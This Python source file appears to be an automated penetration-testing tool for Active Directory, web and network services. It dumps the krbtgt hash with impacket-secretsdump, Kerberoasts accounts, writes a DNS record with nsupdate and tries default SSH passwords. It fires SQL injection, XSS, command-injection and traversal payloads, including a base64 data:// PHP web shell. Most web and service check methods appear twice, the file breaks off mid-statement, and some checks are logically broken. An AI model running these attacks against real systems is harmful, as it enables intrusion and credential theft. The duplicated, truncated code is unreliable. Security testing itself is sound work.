#!/usr/bin/env python3
import subprocess
import os
import json
import requests
import re
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor
import shutil
import nmap

class ActiveDirectoryTester:
    def __init__(self, target, logger, tool_manager):
        self.target = target
        self.logger = logger
        self.tool_manager = tool_manager
        
    def enumerate_domain_users(self):
        """Enumerate domain users through LDAP or RPC"""
        try:
            # Try LDAP first
            ldap_command = f"ldapsearch -h {self.target} -x -b 'DC=domain,DC=local' '(objectClass=user)'"
            result = self.tool_manager.run_tool("ldapsearch", ldap_command)
            if result:
                return self._parse_ldap_users(result)
            
            # Fallback to RPC
            rpc_command = f"rpcclient -U '' -N {self.target} -c 'enumdomusers'"
            result = self.tool_manager.run_tool("rpcclient", rpc_command)
            return self._parse_rpc_users(result)
        except Exception as e:
            self.logger.error(f"Failed to enumerate domain users: {str(e)}")
            return {}
    
    def test_adcs_vulnerabilities(self):
        """Test for ADCS vulnerabilities (seen in Mist)"""
        self.logger.info("Testing for ADCS ESC1-ESC8 vulnerabilities...")
        
        try:
            # Check for certificate templates with vulnerable settings
            certipy_command = f"certipy find -u user@{self.target} -p 'password' -vulnerable"
            result = self.tool_manager.run_tool("certipy", certipy_command)
            return self._parse_certipy_output(result)
        except Exception as e:
            self.logger.error(f"Failed to test ADCS vulnerabilities: {str(e)}")
            return {}
        
    def test_kerberos_vulnerabilities(self):
        """Test for Kerberos-based vulnerabilities"""
        vulnerabilities = {
            "asreproast": self._test_asreproast(),
            "kerberoast": self._test_kerberoast(),
            "delegation": self._test_delegation_issues(),
            "golden_ticket": self._test_golden_ticket(),
            "silver_ticket": self._test_silver_ticket(),
            "diamond_ticket": self._test_diamond_ticket()
        }
        
        return vulnerabilities
        
    def test_dns_vulnerabilities(self):
        """Test for DNS-related vulnerabilities"""
        vulnerabilities = {
            "dns_zone_transfer": self._test_dns_zone_transfer(),
            "dns_records": self._test_dns_records(),
            "dns_dynamic_updates": self._test_dns_dynamic_updates()
        }
        
        return vulnerabilities
        
    def test_ntlm_vulnerabilities(self):
        """Test for NTLM-related vulnerabilities"""
        vulnerabilities = {
            "ntlm_relay": self._test_ntlm_relay(),
            "ntlm_auth": self._test_ntlm_auth(),
            "ntlm_ssp": self._test_ntlm_ssp()
        }
        
        return vulnerabilities

    def _test_golden_ticket(self):
        """Test for Golden Ticket vulnerability"""
        try:
            # Check if we have necessary tools
            if not self._check_impacket_tools():
                return {"vulnerable": False, "error": "Required tools not available"}
            
            # Get krbtgt hash
            krbtgt_command = f"impacket-secretsdump -just-dc-ntlm domain/user:password@{self.target}"
            result = self.tool_manager.run_tool("impacket-secretsdump", krbtgt_command)
            
            if "krbtgt" in result.lower():
                return {
                    "vulnerable": True,
                    "details": "KRBTGT hash found, Golden Ticket attack possible"
                }
            return {"vulnerable": False}
        except Exception as e:
            self.logger.error(f"Failed to test Golden Ticket: {str(e)}")
            return {"vulnerable": False, "error": str(e)}

    def _test_silver_ticket(self):
        """Test for Silver Ticket vulnerability"""
        try:
            # Check service accounts
            service_command = f"impacket-GetUserSPNs -dc-ip {self.target} domain/user:password"
            result = self.tool_manager.run_tool("impacket-GetUserSPNs", service_command)
            
            if "ServicePrincipalName" in result:
                return {
                    "vulnerable": True,
                    "details": "Service accounts found, Silver Ticket attack possible"
                }
            return {"vulnerable": False}
        except Exception as e:
            self.logger.error(f"Failed to test Silver Ticket: {str(e)}")
            return {"vulnerable": False, "error": str(e)}

    def _test_diamond_ticket(self):
        """Test for Diamond Ticket vulnerability"""
        try:
            # Check for unconstrained delegation
            delegation_command = f"impacket-findDelegation -dc-ip {self.target} domain/user:password"
            result = self.tool_manager.run_tool("impacket-findDelegation", delegation_command)
            
            if "unconstrained" in result.lower():
                return {
                    "vulnerable": True,
                    "details": "Unconstrained delegation found, Diamond Ticket attack possible"
                }
            return {"vulnerable": False}
        except Exception as e:
            self.logger.error(f"Failed to test Diamond Ticket: {str(e)}")
            return {"vulnerable": False, "error": str(e)}

    def _test_dns_zone_transfer(self):
        """Test for DNS Zone Transfer vulnerability"""
        try:
            # Try zone transfer
            dig_command = f"dig @{self.target} domain.local AXFR"
            result = self.tool_manager.run_tool("dig", dig_command)
            
            if "SOA" in result and "NS" in result:
                return {
                    "vulnerable": True,
                    "details": "DNS Zone Transfer successful"
                }
            return {"vulnerable": False}
        except Exception as e:
            self.logger.error(f"Failed to test DNS Zone Transfer: {str(e)}")
            return {"vulnerable": False, "error": str(e)}

    def _test_dns_records(self):
        """Test for sensitive DNS records"""
        try:
            # Check for common sensitive records
            records = ["_ldap", "_kerberos", "_kpasswd", "_gc", "_domaincontroller"]
            found_records = []
            
            for record in records:
                dig_command = f"dig @{self.target} {record}.domain.local"
                result = self.tool_manager.run_tool("dig", dig_command)
                if "ANSWER" in result:
                    found_records.append(record)
            
            if found_records:
                return {
                    "vulnerable": True,
                    "details": f"Found sensitive DNS records: {', '.join(found_records)}"
                }
            return {"vulnerable": False}
        except Exception as e:
            self.logger.error(f"Failed to test DNS records: {str(e)}")
            return {"vulnerable": False, "error": str(e)}

    def _test_dns_dynamic_updates(self):
        """Test for DNS Dynamic Updates vulnerability"""
        try:
            # Try to add a record
            nsupdate_command = f"nsupdate -d << EOF\nserver {self.target}\nupdate add test.domain.local 3600 A 1.1.1.1\nsend\nEOF"
            result = self.tool_manager.run_tool("nsupdate", nsupdate_command)
            
            if "NOERROR" in result:
                return {
                    "vulnerable": True,
                    "details": "DNS Dynamic Updates allowed"
                }
            return {"vulnerable": False}
        except Exception as e:
            self.logger.error(f"Failed to test DNS Dynamic Updates: {str(e)}")
            return {"vulnerable": False, "error": str(e)}

    def _test_ntlm_relay(self):
        """Test for NTLM Relay vulnerability"""
        try:
            # Check for NTLM authentication
            smb_command = f"smbclient -L //{self.target} -N"
            result = self.tool_manager.run_tool("smbclient", smb_command)
            
            if "NT_STATUS" in result:
                return {
                    "vulnerable": True,
                    "details": "NTLM authentication detected, relay attack possible"
                }
            return {"vulnerable": False}
        except Exception as e:
            self.logger.error(f"Failed to test NTLM Relay: {str(e)}")
            return {"vulnerable": False, "error": str(e)}

    def _test_ntlm_auth(self):
        """Test for NTLM Authentication vulnerabilities"""
        try:
            # Check for NTLMv1
            ntlm_command = f"nmap -p445 --script smb-protocols {self.target}"
            result = self.tool_manager.run_tool("nmap", ntlm_command)
            
            if "NTLMv1" in result:
                return {
                    "vulnerable": True,
                    "details": "NTLMv1 authentication detected"
                }
            return {"vulnerable": False}
        except Exception as e:
            self.logger.error(f"Failed to test NTLM Auth: {str(e)}")
            return {"vulnerable": False, "error": str(e)}

    def _test_ntlm_ssp(self):
        """Test for NTLM SSP vulnerabilities"""
        try:
            # Check for NTLM SSP
            ssp_command = f"nmap -p445 --script smb-security-mode {self.target}"
            result = self.tool_manager.run_tool("nmap", ssp_command)
            
            if "NTLM" in result and "Message signing: disabled" in result:
                return {
                    "vulnerable": True,
                    "details": "NTLM SSP with message signing disabled"
                }
            return {"vulnerable": False}
        except Exception as e:
            self.logger.error(f"Failed to test NTLM SSP: {str(e)}")
            return {"vulnerable": False, "error": str(e)}

    def _check_impacket_tools(self):
        """Check if required Impacket tools are available"""
        required_tools = [
            "impacket-secretsdump",
            "impacket-GetUserSPNs",
            "impacket-findDelegation"
        ]
        for tool in required_tools:
            if not shutil.which(tool):
                return False
        return True

    def _parse_ldap_users(self, ldap_output):
        """Parse LDAP output to extract user information"""
        users = {}
        current_user = None
        
        for line in ldap_output.split('\n'):
            if line.startswith('dn:'):
                current_user = line.split(',')[0].split('=')[1]
                users[current_user] = {}
            elif current_user and ':' in line:
                key, value = line.split(':', 1)
                users[current_user][key.strip()] = value.strip()
        
        return users

    def _parse_certipy_output(self, certipy_output):
        """Parse Certipy output to identify vulnerabilities"""
        vulnerabilities = {
            "esc1": False,
            "esc2": False,
            "esc3": False,
            "esc4": False,
            "esc5": False,
            "esc6": False,
            "esc7": False,
            "esc8": False
        }
        
        for line in certipy_output.split('\n'):
            if "ESC1" in line:
                vulnerabilities["esc1"] = True
            elif "ESC2" in line:
                vulnerabilities["esc2"] = True
            # ... and so on for other ESC vulnerabilities
        
        return vulnerabilities

    def _test_asreproast(self):
        """Test for AS-REP Roasting vulnerability"""
        try:
            asreproast_cmd = f"impacket-GetNPUsers -dc-ip {self.target} domain/ -usersfile users.txt -format hashcat -outputfile asreproast.txt"
            result = self.tool_manager.run_tool("impacket-GetNPUsers", asreproast_cmd)
            return {"vulnerable": "AS-REP" in result, "details": result}
        except Exception as e:
            self.logger.error(f"Failed to test AS-REP Roasting: {str(e)}")
            return {"vulnerable": False, "details": str(e)}

    def _test_kerberoast(self):
        """Test for Kerberoasting vulnerability"""
        try:
            kerberoast_cmd = f"impacket-GetUserSPNs -dc-ip {self.target} domain/user:password -outputfile kerberoast.txt"
            result = self.tool_manager.run_tool("impacket-GetUserSPNs", kerberoast_cmd)
            return {"vulnerable": "SPN" in result, "details": result}
        except Exception as e:
            self.logger.error(f"Failed to test Kerberoasting: {str(e)}")
            return {"vulnerable": False, "details": str(e)}

    def _test_delegation_issues(self):
        """Test for delegation vulnerabilities"""
        try:
            delegation_cmd = f"impacket-findDelegation -dc-ip {self.target} domain/user:password"
            result = self.tool_manager.run_tool("impacket-findDelegation", delegation_cmd)
            return {"vulnerable": "delegation" in result.lower(), "details": result}
        except Exception as e:
            self.logger.error(f"Failed to test delegation issues: {str(e)}")
            return {"vulnerable": False, "details": str(e)}

class PompemExploitFinder:
    def __init__(self, target, logger, tool_manager):
        self.target = target
        self.logger = logger
        self.tool_manager = tool_manager
        self.pompem_path = self._get_pompem_path()
        
    def _get_pompem_path(self):
        """Get the path to Pompem installation"""
        # Check if Pompem is installed
        if shutil.which("pompem"):
            return "pompem"
            
        # Check for local installation
        local_path = os.path.join(os.path.dirname(__file__), "tools", "pompem", "pompem.py")
        if os.path.exists(local_path):
            return local_path
            
        # If not found, download and install
        return self._install_pompem()
        
    def _install_pompem(self):
        """Download and install Pompem"""
        try:
            # Create tools directory if it doesn't exist
            tools_dir = os.path.join(os.path.dirname(__file__), "tools")
            os.makedirs(tools_dir, exist_ok=True)
            
            # Clone Pompem repository
            pompem_dir = os.path.join(tools_dir, "pompem")
            if not os.path.exists(pompem_dir):
                self.tool_manager.run_tool("git", f"git clone https://github.com/rfunix/Pompem.git {pompem_dir}")
            
            # Install dependencies
            requirements_path = os.path.join(pompem_dir, "requirements.txt")
            if os.path.exists(requirements_path):
                self.tool_manager.run_tool("pip", f"pip install -r {requirements_path}")
            
            return os.path.join(pompem_dir, "pompem.py")
        except Exception as e:
            self.logger.error(f"Failed to install Pompem: {str(e)}")
            return None
            
    def search_exploits(self, keywords):
        """Search for exploits using Pompem"""
        try:
            if not self.pompem_path:
                return {"error": "Pompem not available"}
                
            # Prepare keywords for search
            if isinstance(keywords, list):
                keywords = ",".join(keywords)
                
            # Run Pompem search
            command = f"python3 {self.pompem_path} -s {keywords}"
            result = self.tool_manager.run_tool("python3", command)
            
            if not result:
                return {"error": "No results found"}
                
            # Parse results
            return self._parse_pompem_results(result)
        except Exception as e:
            self.logger.error(f"Failed to search exploits: {str(e)}")
            return {"error": str(e)}
            
    def _parse_pompem_results(self, output):
        """Parse Pompem output into structured format"""
        results = {
            "exploits": [],
            "vulnerabilities": [],
            "metadata": {}
        }
        
        try:
            # Split output into sections
            sections = output.split("\n\n")
            
            for section in sections:
                if "Exploit Title:" in section:
                    exploit = self._parse_exploit_section(section)
                    if exploit:
                        results["exploits"].append(exploit)
                elif "Vulnerability:" in section:
                    vuln = self._parse_vulnerability_section(section)
                    if vuln:
                        results["vulnerabilities"].append(vuln)
                        
            # Extract metadata
            results["metadata"] = {
                "total_exploits": len(results["exploits"]),
                "total_vulnerabilities": len(results["vulnerabilities"]),
                "search_time": datetime.now().isoformat()
            }
            
            return results
        except Exception as e:
            self.logger.error(f"Failed to parse Pompem results: {str(e)}")
            return {"error": str(e)}
            
    def _parse_exploit_section(self, section):
        """Parse an exploit section from Pompem output"""
        try:
            exploit = {}
            lines = section.split("\n")
            
            for line in lines:
                if "Exploit Title:" in line:
                    exploit["title"] = line.split(":", 1)[1].strip()
                elif "Date:" in line:
                    exploit["date"] = line.split(":", 1)[1].strip()
                elif "Author:" in line:
                    exploit["author"] = line.split(":", 1)[1].strip()
                elif "Type:" in line:
                    exploit["type"] = line.split(":", 1)[1].strip()
                elif "Platform:" in line:
                    exploit["platform"] = line.split(":", 1)[1].strip()
                elif "URL:" in line:
                    exploit["url"] = line.split(":", 1)[1].strip()
                    
            return exploit if exploit else None
        except Exception:
            return None
            
    def _parse_vulnerability_section(self, section):
        """Parse a vulnerability section from Pompem output"""
        try:
            vuln = {}
            lines = section.split("\n")
            
            for line in lines:
                if "Vulnerability:" in line:
                    vuln["name"] = line.split(":", 1)[1].strip()
                elif "CVE:" in line:
                    vuln["cve"] = line.split(":", 1)[1].strip()
                elif "CVSS:" in line:
                    vuln["cvss"] = line.split(":", 1)[1].strip()
                elif "Description:" in line:
                    vuln["description"] = line.split(":", 1)[1].strip()
                    
            return vuln if vuln else None
        except Exception:
            return None

class VulnerabilityAssessment:
    def __init__(self, target, logger, tool_manager=None, execution_engine=None, credentials=None):
        self.target = target
        self.logger = logger
        self.tool_manager = tool_manager
        self.execution_engine = execution_engine
        self.credentials = credentials or {}
        self.output_dir = "reports/vulnerability_assessment"
        self.findings = {}
        
        # Create output directory if it doesn't exist
        if not os.path.exists(self.output_dir):
            os.makedirs(self.output_dir)
            
        # Load information gathering results if available
        self.info_gathering_results = self._load_info_gathering_results()
        
        # Initialize ActiveDirectoryTester
        self.ad_tester = ActiveDirectoryTester(target, logger, tool_manager)
        
        # Initialize PompemExploitFinder
        self.exploit_finder = PompemExploitFinder(target, logger, tool_manager)

    def _load_info_gathering_results(self):
        """Load results from information gathering stage"""
        try:
            info_gathering_dir = max([d for d in os.listdir("reports") if d.startswith("info_gathering_")])
            with open(f"reports/{info_gathering_dir}/findings.json", 'r') as f:
                return json.load(f)
        except Exception as e:
            self.logger.error(f"Failed to load information gathering results: {str(e)}")
            return None

    def run(self):
        """Main method to run all vulnerability assessment tasks"""
        self.logger.info(f"Starting vulnerability assessment for {self.target}")
        
        try:
            # Run all vulnerability assessment tasks
            self.findings = {
                "nmap_vuln_scan": self.run_nmap_vuln_scan(),
                "web_vulnerabilities": self.check_web_vulnerabilities(),
                "service_vulnerabilities": self.check_service_vulnerabilities(),
                "misconfigurations": self.check_misconfigurations()
            }
            
            # Save findings to file
            self._save_findings()
            
            return self.findings
            
        except Exception as e:
            self.logger.error(f"Error during vulnerability assessment: {str(e)}")
            return {}
            
    def _save_findings(self):
        """Save findings to JSON file"""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        output_file = f"{self.output_dir}/findings_{self.target}_{timestamp}.json"
        
        with open(output_file, 'w') as f:
            json.dump(self.findings, f, indent=4)
            
        self.logger.info(f"Findings saved to {output_file}")
        
    def run_nmap_vuln_scan(self):
        """Run nmap vulnerability scan"""
        self.logger.info("Running nmap vulnerability scan...")
        
        try:
            # Initialize nmap scanner
            nm = nmap.PortScanner()
            
            # Run vulnerability scan with common scripts
            nm.scan(self.target, arguments='-sV --script vuln,auth,default')
            
            vuln_findings = {}
            for host in nm.all_hosts():
                for proto in nm[host].all_protocols():
                    ports = nm[host][proto].keys()
                    for port in ports:
                        if 'script' in nm[host][proto][port]:
                            vuln_findings[f"{proto}/{port}"] = nm[host][proto][port]['script']
            
            # Save nmap vulnerability scan results
            nmap_file = f"{self.output_dir}/nmap_vuln_{self.target}.json"
            with open(nmap_file, 'w') as f:
                json.dump(vuln_findings, f, indent=4)
                
            return vuln_findings
            
        except Exception as e:
            self.logger.error(f"Error during nmap vulnerability scan: {str(e)}")
            return {}
            
    def check_web_vulnerabilities(self):
        """Check for web vulnerabilities"""
        self.logger.info("Checking web vulnerabilities...")
        
        web_vulns = {}
        try:
            # Check common web ports
            web_ports = [80, 443, 8080, 8443]
            
            for port in web_ports:
                try:
                    protocol = 'https' if port in [443, 8443] else 'http'
                    url = f"{protocol}://{self.target}:{port}"
                    
                    # Check if service is running
                    response = requests.get(url, verify=False, timeout=5)
                    
                    if response.status_code < 400:
                        web_vulns[port] = {
                            'sql_injection': self._check_sql_injection(url),
                            'xss': self._check_xss(url),
                            'file_inclusion': self._check_file_inclusion(url),
                            'command_injection': self._check_command_injection(url),
                            'directory_traversal': self._check_directory_traversal(url)
                        }
                except:
                    continue
            
            # Save web vulnerability results
            web_vuln_file = f"{self.output_dir}/web_vuln_{self.target}.json"
            with open(web_vuln_file, 'w') as f:
                json.dump(web_vulns, f, indent=4)
                
            return web_vulns
            
        except Exception as e:
            self.logger.error(f"Error checking web vulnerabilities: {str(e)}")
            return {}
            
    def check_service_vulnerabilities(self):
        """Check for service-specific vulnerabilities"""
        self.logger.info("Checking service vulnerabilities...")
        
        service_vulns = {}
        try:
            # Check common services
            services = {
                21: self._check_ftp_vulnerabilities,
                22: self._check_ssh_vulnerabilities,
                445: self._check_smb_vulnerabilities,
                3306: self._check_mysql_vulnerabilities
            }
            
            for port, check_func in services.items():
                try:
                    vulns = check_func(port)
                    if vulns:
                        service_vulns[port] = vulns
                except Exception as e:
                    self.logger.error(f"Error checking service on port {port}: {str(e)}")
            
            # Save service vulnerability results
            service_vuln_file = f"{self.output_dir}/service_vuln_{self.target}.json"
            with open(service_vuln_file, 'w') as f:
                json.dump(service_vulns, f, indent=4)
                
            return service_vulns
            
        except Exception as e:
            self.logger.error(f"Error checking service vulnerabilities: {str(e)}")
            return {}
            
    def check_misconfigurations(self):
        """Check for common misconfigurations"""
        self.logger.info("Checking for misconfigurations...")
        
        misconfigs = {}
        try:
            # Check common misconfigurations
            misconfigs = {
                'default_credentials': self._check_default_credentials(),
                'exposed_files': self._check_exposed_files(),
                'information_disclosure': self._check_information_disclosure(),
                'weak_permissions': self._check_weak_permissions()
            }
            
            # Save misconfiguration results
            misconfig_file = f"{self.output_dir}/misconfig_{self.target}.json"
            with open(misconfig_file, 'w') as f:
                json.dump(misconfigs, f, indent=4)
                
            return misconfigs
            
        except Exception as e:
            self.logger.error(f"Error checking misconfigurations: {str(e)}")
            return {}
            
    def _check_sql_injection(self, url):
        """Check for SQL injection vulnerabilities"""
        payloads = [
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' OR '1'='1' #",
            "admin' --",
            "admin' #"
        ]
        
        results = []
        for payload in payloads:
            try:
                response = requests.get(f"{url}?id={payload}", verify=False, timeout=5)
                if self._is_sql_injection_successful(response):
                    results.append({
                        'payload': payload,
                        'type': 'SQL Injection',
                        'evidence': response.text[:100]  # First 100 chars as evidence
                    })
            except:
                continue
                
        return results
        
    def _check_xss(self, url):
        """Check for XSS vulnerabilities"""
        payloads = [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            "javascript:alert(1)"
        ]
        
        results = []
        for payload in payloads:
            try:
                response = requests.get(f"{url}?q={payload}", verify=False, timeout=5)
                if payload in response.text:
                    results.append({
                        'payload': payload,
                        'type': 'XSS',
                        'evidence': response.text[:100]  # First 100 chars as evidence
                    })
            except:
                continue
                
        return results
        
    def _check_file_inclusion(self, url):
        """Check for file inclusion vulnerabilities"""
        payloads = [
            "../../../etc/passwd",
            "php://filter/convert.base64-encode/resource=index.php",
            "php://input",
            "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4="
        ]
        
        results = []
        for payload in payloads:
            try:
                response = requests.get(f"{url}?file={payload}", verify=False, timeout=5)
                if self._is_file_inclusion_successful(response):
                    results.append({
                        'payload': payload,
                        'type': 'File Inclusion',
                        'evidence': response.text[:100]  # First 100 chars as evidence
                    })
            except:
                continue
                
        return results
        
    def _check_command_injection(self, url):
        """Check for command injection vulnerabilities"""
        payloads = [
            ";id;",
            "| id",
            "$(id)",
            "`id`",
            "&& id"
        ]
        
        results = []
        for payload in payloads:
            try:
                response = requests.get(f"{url}?cmd={payload}", verify=False, timeout=5)
                if self._is_command_injection_successful(response):
                    results.append({
                        'payload': payload,
                        'type': 'Command Injection',
                        'evidence': response.text[:100]  # First 100 chars as evidence
                    })
            except:
                continue
                
        return results
        
    def _check_directory_traversal(self, url):
        """Check for directory traversal vulnerabilities"""
        payloads = [
            "../../../etc/passwd",
            "..%2f..%2f..%2fetc%2fpasswd",
            "....//....//....//etc/passwd",
            "%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd"
        ]
        
        results = []
        for payload in payloads:
            try:
                response = requests.get(f"{url}?path={payload}", verify=False, timeout=5)
                if self._is_directory_traversal_successful(response):
                    results.append({
                        'payload': payload,
                        'type': 'Directory Traversal',
                        'evidence': response.text[:100]  # First 100 chars as evidence
                    })
            except:
                continue
                
        return results
        
    def _check_ftp_vulnerabilities(self, port):
        """Check FTP vulnerabilities"""
        vulns = []
        try:
            # Check anonymous access
            ftp_cmd = f"ftp -n {self.target} {port}"
            result = subprocess.run(ftp_cmd.split(), capture_output=True, text=True)
            
            if "Anonymous access granted" in result.stdout:
                vulns.append({
                    'type': 'Anonymous FTP Access',
                    'severity': 'High',
                    'details': 'Anonymous access is enabled'
                })
        except:
            pass
            
        return vulns
        
    def _check_ssh_vulnerabilities(self, port):
        """Check SSH vulnerabilities"""
        vulns = []
        try:
            # Check SSH version
            ssh_cmd = f"ssh -v {self.target} -p {port}"
            result = subprocess.run(ssh_cmd.split(), capture_output=True, text=True)
            
            if "SSH-2.0-OpenSSH" in result.stdout:
                version = re.search(r"SSH-2.0-OpenSSH_(\d+\.\d+)", result.stdout)
                if version:
                    vuln_version = float(version.group(1))
                    if vuln_version < 7.0:
                        vulns.append({
                            'type': 'Outdated SSH Version',
                            'severity': 'Medium',
                            'details': f'Running OpenSSH {vuln_version}'
                        })
        except:
            pass
            
        return vulns
        
    def _check_smb_vulnerabilities(self, port):
        """Check SMB vulnerabilities"""
        vulns = []
        try:
            # Check for null sessions
            smb_cmd = f"smbclient -L //{self.target} -p {port} -N"
            result = subprocess.run(smb_cmd.split(), capture_output=True, text=True)
            
            if "Sharename" in result.stdout:
                vulns.append({
                    'type': 'SMB Null Session',
                    'severity': 'High',
                    'details': 'Null sessions are allowed'
                })
        except:
            pass
            
        return vulns
        
    def _check_mysql_vulnerabilities(self, port):
        """Check MySQL vulnerabilities"""
        vulns = []
        try:
            # Check for root access without password
            mysql_cmd = f"mysql -h {self.target} -P {port} -u root -e 'SELECT 1'"
            result = subprocess.run(mysql_cmd.split(), capture_output=True, text=True)
            
            if "ERROR" not in result.stdout:
                vulns.append({
                    'type': 'MySQL Root Access',
                    'severity': 'Critical',
                    'details': 'Root access without password is possible'
                })
        except:
            pass
            
        return vulns
        
    def _check_default_credentials(self):
        """Check for default credentials"""
        default_creds = {
            'admin': ['admin', 'password', 'admin123'],
            'root': ['root', 'toor', 'password'],
            'user': ['user', 'password', 'user123']
        }
        
        results = []
        for username, passwords in default_creds.items():
            for password in passwords:
                try:
                    # Try SSH
                    ssh_cmd = f"sshpass -p '{password}' ssh -o StrictHostKeyChecking=no {username}@{self.target}"
                    result = subprocess.run(ssh_cmd.split(), capture_output=True, text=True)
                    if "Permission denied" not in result.stdout:
                        results.append({
                            'service': 'SSH',
                            'username': username,
                            'password': password,
                            'severity': 'High'
                        })
                except:
                    pass
                    
        return results
        
    def _check_exposed_files(self):
        """Check for exposed sensitive files"""
        files = [
            '/.git/config',
            '/.env',
            '/wp-config.php',
            '/config.php',
            '/backup.sql',
            '/backup.zip'
        ]
        
        results = []
        for file in files:
            try:
                response = requests.get(f"http://{self.target}{file}", verify=False, timeout=5)
                if response.status_code == 200:
                    results.append({
                        'file': file,
                        'severity': 'High',
                        'details': 'Sensitive file is exposed'
                    })
            except:
                continue
                
        return results
        
    def _check_information_disclosure(self):
        """Check for information disclosure"""
        results = []
        
        # Check common headers
        try:
            response = requests.get(f"http://{self.target}", verify=False, timeout=5)
            headers = response.headers
            
            sensitive_headers = ['Server', 'X-Powered-By', 'X-AspNet-Version']
            for header in sensitive_headers:
                if header in headers:
                    results.append({
                        'type': 'Information Disclosure',
                        'severity': 'Medium',
                        'details': f'{header} header reveals: {headers[header]}'
                    })
        except:
            pass
            
        return results
        
    def _check_weak_permissions(self):
        """Check for weak permissions"""
        results = []
        
        # Check common directories
        directories = ['/uploads', '/backup', '/admin', '/config']
        for directory in directories:
            try:
                response = requests.get(f"http://{self.target}{directory}", verify=False, timeout=5)
                if response.status_code == 200:
                    results.append({
                        'type': 'Weak Permissions',
                        'severity': 'Medium',
                        'details': f'Directory {directory} is accessible'
                    })
            except:
                continue
                
        return results
        
    def _is_sql_injection_successful(self, response):
        """Check if SQL injection was successful"""
        sql_errors = [
            "SQL syntax",
            "mysql_fetch_array",
            "ORA-",
            "PostgreSQL",
            "SQLite3::",
            "Warning: mysql_",
            "Warning: pg_",
            "Warning: sqlsrv_",
            "Warning: oci_"
        ]
        
        return any(error in response.text for error in sql_errors)
        
    def _is_file_inclusion_successful(self, response):
        """Check if file inclusion was successful"""
        return "root:" in response.text or "<?php" in response.text
        
    def _is_command_injection_successful(self, response):
        """Check if command injection was successful"""
        return "uid=" in response.text and "gid=" in response.text
        
    def _is_directory_traversal_successful(self, response):
        """Check if directory traversal was successful"""
        return "root:" in response.text

    def _check_sql_injection(self, url):
        """Check for SQL injection vulnerabilities"""
        payloads = [
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' OR '1'='1' #",
            "admin' --",
            "admin' #"
        ]
        
        results = []
        for payload in payloads:
            try:
                response = requests.get(f"{url}?id={payload}", verify=False, timeout=5)
                if self._is_sql_injection_successful(response):
                    results.append({
                        'payload': payload,
                        'type': 'SQL Injection',
                        'evidence': response.text[:100]  # First 100 chars as evidence
                    })
            except:
                continue
                
        return results
        
    def _check_xss(self, url):
        """Check for XSS vulnerabilities"""
        payloads = [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            "javascript:alert(1)"
        ]
        
        results = []
        for payload in payloads:
            try:
                response = requests.get(f"{url}?q={payload}", verify=False, timeout=5)
                if payload in response.text:
                    results.append({
                        'payload': payload,
                        'type': 'XSS',
                        'evidence': response.text[:100]  # First 100 chars as evidence
                    })
            except:
                continue
                
        return results
        
    def _check_file_inclusion(self, url):
        """Check for file inclusion vulnerabilities"""
        payloads = [
            "../../../etc/passwd",
            "php://filter/convert.base64-encode/resource=index.php",
            "php://input",
            "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4="
        ]
        
        results = []
        for payload in payloads:
            try:
                response = requests.get(f"{url}?file={payload}", verify=False, timeout=5)
                if self._is_file_inclusion_successful(response):
                    results.append({
                        'payload': payload,
                        'type': 'File Inclusion',
                        'evidence': response.text[:100]  # First 100 chars as evidence
                    })
            except:
                continue
                
        return results
        
    def _check_command_injection(self, url):
        """Check for command injection vulnerabilities"""
        payloads = [
            ";id;",
            "| id",
            "$(id)",
            "`id`",
            "&& id"
        ]
        
        results = []
        for payload in payloads:
            try:
                response = requests.get(f"{url}?cmd={payload}", verify=False, timeout=5)
                if self._is_command_injection_successful(response):
                    results.append({
                        'payload': payload,
                        'type': 'Command Injection',
                        'evidence': response.text[:100]  # First 100 chars as evidence
                    })
            except:
                continue
                
        return results
        
    def _check_directory_traversal(self, url):
        """Check for directory traversal vulnerabilities"""
        payloads = [
            "../../../etc/passwd",
            "..%2f..%2f..%2fetc%2fpasswd",
            "....//....//....//etc/passwd",
            "%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd"
        ]
        
        results = []
        for payload in payloads:
            try:
                response = requests.get(f"{url}?path={payload}", verify=False, timeout=5)
                if self._is_directory_traversal_successful(response):
                    results.append({
                        'payload': payload,
                        'type': 'Directory Traversal',
                        'evidence': response.text[:100]  # First 100 chars as evidence
                    })
            except:
                continue
                
        return results
        
    def _check_ftp_vulnerabilities(self, port):
        """Check FTP vulnerabilities"""
        vulns = []
        try:
            # Check anonymous access
            ftp_cmd = f"ftp -n {self.target} {port}"
            result = subprocess.run(ftp_cmd.split(), capture_output=True, text=True)
            
            if "Anonymous access granted" in result.stdout:
                vulns.append({
                    'type': 'Anonymous FTP Access',
                    'severity': 'High',
                    'details': 'Anonymous access is enabled'
                })
        except:
            pass
            
        return vulns
        
    def _check_ssh_vulnerabilities(self, port):
        """Check SSH vulnerabilities"""
        vulns = []
        try:
            # Check SSH version
            ssh_cmd = f"ssh -v {self.target} -p {port}"
            result = subprocess.run(ssh_cmd.split(), capture_output=True, text=True)
            
            if "SSH-2.0-OpenSSH" in result.stdout:
                version = re.search(r"SSH-2.0-OpenSSH_(\d+\.\d+)", result.stdout)
                if version:
                    vuln_version = float(version.group(1))
                    if vuln_version < 7.0:
                        vulns.append({
                            'type': 'Outdated SSH Version',
                            'severity': 'Medium',
                            'details': f'Running OpenSSH {vuln_version}'
                        })
        except:
            pass
            
        return vulns
        
    def _check_smb_vulnerabilities(self, port):
        """Check SMB vulnerabilities"""
        vulns = []
        try:
            # Check for null sessions
            smb_cmd = f"smbclient -L //{self.target} -p {port} -N"
            result = subprocess.run(smb_cmd.split(), capture_output=True, text=True)
            
            if "Sharename" in result.stdout:
                vulns.append({
                    'type': 'SMB Null Session',
                    'severity': 'High',
                    'details': 'Null sessions are allowed'
                })
        except:
            pass
            
        return vulns
        
    def _check_mysql_vulnerabilities(self, port):
        """Check MySQL vulnerabilities"""
        vulns = []
        try:
            # Check for root access without password
            mysql_cmd = f"mysql -h {self.target} -P {port} -u root -e 'SELECT 1'"
            result = subprocess.run(mysql_cmd.split(), capture_output=True, text=True)
            
            if "ERROR" not in result.stdout:
                vulns.append({
